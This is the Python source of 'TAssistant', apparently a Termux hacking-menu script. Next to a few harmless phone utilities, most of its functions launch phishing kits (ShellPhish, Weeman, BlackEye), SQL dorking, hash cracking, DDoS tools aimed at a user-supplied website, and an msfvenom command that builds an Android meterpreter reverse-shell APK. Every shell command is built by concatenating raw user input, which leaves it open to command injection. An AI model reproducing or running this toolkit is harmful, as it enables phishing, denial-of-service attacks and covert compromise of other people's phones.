import os
import sys
import os.path
import time
import random
from termcolor import colored
import urllib

######FUNCTION

PATH='./modules/test.txt'

def checkfile():
 if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
    print "Every thing is allright"
 else:
    print "some files is not installed"
    time.sleep(2)
    exit()

def netcheck():
 print(colored("""CHECKING INTERNET ON/OFF""", "green"))
 try :
    stri = "https://www.google.co.in"
    data = urllib.urlopen(stri)
    print "Connected"
 except:
    print(colored("""THIS TOOL REQUIRE INTERNET""", "red"))
    exit()

def help():
 print(colored("""
  ##########################
 	TAssistant
   Github-:aniketstark
   Instagram-:@aniketstark330
  ##########################
  
 basic Commands

 flash light on/off
 battery info or battery
 capture photo or photo
 text to speach or textspeach

 Advance Commands

 hash or hash decrypt or hasher <=== this will decrypt hash
 dork or sqldork
 start phishing or phishing
 start webhacking or webhacking
 start port forwarding or port forward
 create payload  or payload
 
 Tools

 install stark2.0 or stark2.0 (soon....)
 install lazymeta or lazymeta (soon....)

 Credit or Credits
 """, "green"))

########ADVANCE LEVEL

def Phishing():
 print(colored("""
  ###################################
  1. ShellPhish
  2. Weeman
  3. BlackEye
  ##################################
  """, "red"))
 phish = raw_input("phishing > ")
 if  phish == "1":
   os.system("cd modules/shellphish && bash shellphish.sh")
 elif phish  == "2":
   os.system("cd modules/weeman && python2 weeman.py")
 elif phish  == "3":
   os.system("cd modules/blackeye/ && bash blackeye.sh")

def webhack():
 print(colored("""
  #################################
  1. Red_Hawk
  2. SQL Dork
  more tools are comming soon
  #################################
  """, "green"))
 web = raw_input("webh > ")
 if web == "1":
  os.system("cd modules/RED_HAWK && php rhawk.php")
 elif web == "2":
  sqldork()

def portforward():
 print(colored("""
  #######################
  1. HTTP
  2. TCP
  ######################
  """, "green"))
 port = raw_input("portf > ")
 if port == "1":
  p1 = raw_input("HTTPS > ")
  os.system("ssh -R 80:localhost:"+ p1 +" serveo.net")
 if port == "2":
  p2 = raw_input("TCP > ")
  os.system("ssh -R "+ p2 +":localhost:"+ p2 +" serveo.net")

def payload():
 print(colored("""
  #######################
  1. Android
  #######################
  """, "green"))
 pay = raw_input("pay > ")
 if pay == "1":
  print(colored("""Enter LocalHost And LPort""", "green"))
  l1 = raw_input("host > ")
  l2 = raw_input("port > ")
  os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ l1 +" LPORT="+ l2 +" R > /sdcard/payload.apk")
  print(colored("""payload save in sdcard payload.apk""", "green"))

def sqldork():
  os.system("cd modules/SCANNER-INURLBR/ && bash sql.sh")

def Hash():
 netcheck()
 print(colored("""
  #######################
  1. Hash-Buster
  2. Hasher
  #######################
  """, "green"))
 hasher = raw_input("hash > ")
 if hasher == "1":
  os.system("cd modules/Hash-Buster && python hash.py")
 elif hasher == "2":
  os.system("cd modules/hasher && python2 hash.py")

def ddos():
 netcheck()
 print(colored("""
  #########################
  1. TorshHammer
  2. GoldenEye
  3. Hulk
  ########################
  """, "green"))
 dos = raw_input("DDOS > ")
 if dos == "1":
  print(colored("""Enter Website Link""", "green"))
  dos1 = raw_input("url > ")
  os.system("cd modules/torshammer/ && python2 torshammer.py -t "+ dos1 +" -r 256")
 elif dos == "2":
  print(colored("""Enter Website Link""", "green"))
  dos2 = raw_input("url > ")
  os.system("cd modules/GoldenEye/ && python2 goldeneye.py "+ dos2 +" -w 10 -s 500")
 elif dos == "3":
  print(colored("""Enter Website Link""", "green"))
  print(colored("""Hulk is unstable""", "red"))
  dos3 = raw_input("url > ")
  os.system("cd modules/hulk && python2 hulk.py "+ dos3 +" safe")
####BASIC LEVEL

def battery():
 os.system("termux-battery-status")

def cphoto():
 print(colored("""
  #####################
  1.Back
  2.Front
  ####################
  """, "green"))
 cp = raw_input("photo > ")
 if cp == "1":
  os.system("termux-camera-photo -c 0 /sdcard/back")
  print(colored("""image has been saved in /sdcard/back.jpg""", "green"))
 elif cp == "2":
  os.system("termux-camera-photo -c 1 /sdcard/front")
  print(colored("""image has been saved in /sdcard/front.jpg""", "green"))

def textspeach():
 print(colored("""Enter here your words sir""", "green"))
 txtsp = raw_input("text > ")
 os.system("termux-tts-speak "+ txtsp +".")

def visit():
 print(colored("""
  #######################
  1. Visit Blogger
  2. Visit Instagram
  3. Visit YouTube Channel
  ########################
  """, "green"))
 visit = raw_input("go > ")
 if visit == "1":
  os.system("termux-open-url https://gamerstech330.blogspot.com/")
 elif visit == "2":
  os.system("termux-open-url https://instagram.com/aniketstark330")
 elif visit == "3":
  os.system("termux-open-url https://www.youtube.com/channel/UCjb4zsUpNuSSaCCUirQL_sQ")

def credit():
 printslow(colored("""
  This Script Was Creates by 
  Manish and Aniket Stark 
  ####################################
  TOOLS			DEVELOPERS
  ####################################
  ShellPhish		TheLinuxChoice
  BlackEye		TheLinuxChoice
  Weeman		Evait Security GmbH
  Red_Hawk		Tuhinshubhra
  Hasher		CiKu370
  SCANNER-INURLBR	GoogleINURL
  TorsHammer		TheLinuxChoice
  Hulk			Grafov
  GoldenEye		Jseidl
  ####################################
  """, "green"))

#####TALK SYSTEM
hi = [
    "how are you",
    "nice to meet you",
    "ok hello",
]

def printslow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)


